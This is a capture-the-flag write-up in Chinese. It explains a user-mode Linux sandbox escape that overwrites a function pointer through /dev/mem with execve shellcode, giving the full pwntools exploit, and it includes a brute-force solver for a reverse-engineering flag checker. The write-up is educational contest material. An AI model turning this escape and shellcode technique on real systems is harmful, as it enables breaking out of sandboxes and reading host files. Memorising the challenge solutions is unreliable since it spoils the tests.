## Pwn

### uml

uml 為 **u**ser**m**ode **l**inux 的縮寫，實際上就是透過 linux 原生的機制讓 kernel 可以在 usermode 用 process 的方式執行，並且建立一個獨立的環境。

這題的 flag 在 host，因此需要做 sandbox escape，而我們在連線後會執行一個 uml，進入 kernel 後會發現預設所持有的權限是 root，意即至少可以存取所有的檔案，不過載入所執行的 `init` 是跑一個可以任意讀檔任意寫檔，但只限定一個檔案的 binary。

而仔細看 binary 後能發現，在讀取檔案時並不會像寫入，寫完會執行 `unwind()` 將 file pointer 設回原點，因此可以透過讀取來將 position 移至任意 offset，並且寫入任意 data。

有了任意讀與任意寫後，下一步是要找被操作的檔案，通常 `/proc` 底下會有一些特殊的檔案，在擁有 root 權限時可以做一些特別的行為，像是直接存取/寫入 kernel 所在的 memory region。然而該 memory region 因為 kernel 是 uml 的關係，因此其實會是修改到 uml 本體，若此時我們可以找出 uml 在執行過程中會經過的 rwx 位址，就能透過蓋寫成任意 shellcode 來做 exploit。

剛好 uml 與 `init` 所執行的 binary 有使用一塊 **rwx** 的 shared memory，並且在 binary 離開時應該會透過 exit 來離開，因此我搜尋了 exit syscall，看是否能 overwrite 掉指向 syscall handler 的 pointer，也嘗試了直接在 **rwx** 蓋寫 data，觀察是否有 crash 來找出會影響到執行流程的行為。而此時我發現一個 function pointer 似乎就是在 binay exit 時，uml 會用此來 handle binary 結束時相關的資源回收。若我們能蓋寫 function pointer 的話，就能蓋成是自己的 shellcode 的位址，並在 uml (usermode) 執行任意的 shellcode。



其中在做 exploit 時，發現直接執行 `sh` 會因為 stdin 的問題而無法使用，並且 `sys_execve()` 也沒辦法傳 **NULL, NULL**，因此我直接寫了一個類似 `ls` 的 shellcode 以及類似 `cat` 的 shellcode，前面 shellcode 是印出當前目錄的檔案，後面是能夠讀取任意檔案並印出，兩者過程都沒有使用到 stdin，因此不會出問題，exploit 如下：

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) > 1:
    r = remote('3.115.128.152', 3154)
else:
    r = process('./run.sh')


def write(data):
    r.sendlineafter(':', '1')
    r.sendlineafter('Size?', str(len(data)))
    r.send(data)

def read(size):
    r.sendlineafter(':', '2')
    r.sendlineafter('Size?', str(size))

fn = '/../dev/mem'
r.sendlineafter('Name of note?', fn)

def move_to(offset):
    size = 0x10000
    page = offset // size
    rest = offset % size
    for i in range(page):
        read(size)
        r.recvuntil(f'{size}\r\n')
        out = r.recv(size)
        print(f"{i} / {page}")
    if rest != 0:
        read(rest)
        r.recvuntil(f'{rest}\r\n')
        out = r.recv(rest)
        print(f"{i} / {page}")
    if rest != 0:
        read(rest)
        r.recvuntil(f'{rest}\r\n')
        out = r.recv(rest)
        
sc_ls = asm(f"""
push 0
push rsp
mov rdx, rsp

mov rsi, 0x2f6c
push rsi
mov rsi, 0x6d752f656d6f682f
push rsi
mov rsi, rsp

push 0
mov rdi, 0x736c2f6e69622f
push rdi
mov rdi, rsp

push 0
push rsi
push rdi

mov rsi, rsp

mov rdi, 0x736c2f6e69622f
push 0
push rdi
mov rdi, rsp
mov rax, 0x3b
syscall
""")

sc_read = asm(f"""
push 0
push rsp
mov rdx, rsp

push 0
mov rdi, 0x306236
push rdi
mov rdi, 0x6136376166306264
push rdi
mov rdi, 0x362d67616c662f6c
push rdi
mov rdi, 0x6d752f656d6f682f
push rdi
mov rdi, rsp

push 0
mov rsi, 0x7461632f6e69622f
push rsi
mov rsi, rsp

push 0
push rdi
push rsi

mov rsi, rsp

mov rdi, 0x7461632f6e69622f
push 0
push rdi
mov rdi, rsp
mov rax, 0x3b
syscall
""")


move_to(0x481840)
print("/bin/ls", sc_ls, len(sc_ls))
print("/bin/cat", sc_read, len(sc_read))
input('>')
#write(p64(0x60481848) + sc_ls)
write(p64(0x60481848) + sc_read + b'\x03')

r.interactive()
```



## Reverse

### mercy

一開始 @CSY54 發現題目與之前 defcon **clemency** 相似，因此找了滿多的資源，看能不能把以 3 bits 為一組的 insn 轉成看得比較懂的格式，之後發現作者的 repo 有提供 debugger，並且印出的資訊很多。

簡單執行後，會知道他讀了一個 **./flag** 檔案，最後會迅速終止程式，並無太多的資訊。一開始在逆時，我們都先靜態 dump 出 debugger 所印出的 insn 到某個檔案，後續用靜態的方式大概瀏覽整個 binary 的行為。整個程式分成很多部分，並且大概有 6000 行 insn，原本我是想要一個個慢慢看，但是後來覺得實在太多了，比賽結束前應該看不完，而 @CSY54 認為這個程式應該只是個 flag checker，並且程式中判斷 **flag** 是否正確的方式在最後一段 code，因此可以優先看最後一段就好，所以我們就先一起看最後一個看似在比對的 for loop。

而這個部分就是透過看 insn 猜行為，過程中會需要動態執行到對應位址，並透過觀察暫存器的值，以及 stack 與 global data 的變化來確定猜的是對的。

最後得知，程式的末段會將 flag 做一連串的 swap 與運算得到一個陣列，最後每次拿部分 flag 與陣列的一些值做運算，最終比對一個常數，如果是對的那這個 input 就是 flag。關於操作、運算等等較為枯燥，就只是單純逆向 + 猜行為，較有趣的是我發現前面省略的一大串 code，似乎是在產生那一連串要比對常數，不過因為每次都會相同，所以並不會被我們的 input 所 taint，因此果斷不看。

我們以 3 bytes 為一組，隨機產生小 flag，並參考 doc 上面呈現 `MemLocation` 的方式來運算出結果，最後比對常數是否相同，若相同則為正確的 flag，繼續比對下個小 flag；若錯誤則在產生一組隨機的 flag 做測試。最終將通過比較的小 flag 串起來即是 flag：

```python
#!/usr/bin/python3

def show():
    idx = 1
    for i in l:
        print('%03x' % i, end = ' ')
        if idx % 24 == 0:
            print()
        elif idx % 12 == 0:
            print(' - ', end='')
        idx += 1

# check = {
#     '0x21': 0x4062ee8,
#     '0x1e': 0x441d6a8,

#     '0x1b': 0x69edf0e,
#     '0x18': 0x7885b66,
#     '0x15': 0x40ff43f,
#     '0x12': 0x6f30d11,
#     '0xf':  0x624e22d,
#     '0xc':  0x183716f,
#     '0x9':  0x0c7a45e,
# }

check = [
    0x4062ee8,
    0x441d6a8,

    0x69edf0e,
    0x7885b66,
    0x40ff43f,
    0x6f30d11,
    0x624e22d,
    0x183716f,
    0x0c7a45e,
]
import itertools
import string

magic = [0x12b, 0x062, 0x0bc, 0x09c, 0x03b, 0x034, 0x111, 0x089, 0x144]
flag = [b'hit', b'con', b'{AA', b'AAA', b'AAA', b'AAA', b'AAA', b'AAA', b'AA}']
# wordlist = string.ascii_letters + string.digits + '_?!}{.'
wordlist = string.printable

for bt in range(2, 10):
    for w1, w2, w3 in itertools.product(wordlist, wordlist, wordlist):
        l = [i for i in range(0x200)]

        word = (w1+w2+w3).encode()
        flag[bt] = word
        flag_str = b''.join(flag)

        prev_swap_idx = 0
        for i in range(0x200):
            if i == 0:
                swap_idx = magic[i%9] + l[i]
            else:
                swap_idx = (magic[i%9] + l[i] + prev_swap_idx) % 0x200

            l[i], l[swap_idx] = l[swap_idx], l[i]
            prev_swap_idx = swap_idx

        old = 0
        prev_res = 0
        result = []

        for i in range(0x1b):
            old += l[i]
            old %= 0x200
            l[old], l[i] = l[i], l[old]
            sum = (l[i] + l[old]) % 0x200
            c = l[sum]
            r8 = c ^ flag_str[i]
            r10 = prev_res
            r11 = (r8 + r10) % 0x200
            result.append(r11)
            prev_res = r11

        # 3fffbcd
        data = ''
        for i in result:
            data += '%03x' % i

        cnt = 0
        value = 0
        check_list = []
        for i in range(0, len(data), 3):
            if cnt % 3 == 0:
                value += int(data[i:i+3], 16) << 9 
            elif cnt % 3 == 1:
                value += int(data[i:i+3], 16) << 18
            else:
                value += int(data[i:i+3], 16)
                check_list.append(value)
                value = 0
            cnt += 1

        if check_list[bt] == check[bt]:
            print(flag_str)
            break
```

P.S. flag 的最後一個字元是換行，所以 wordlist 需要為 `string.printable` 才能找到正確的小 flag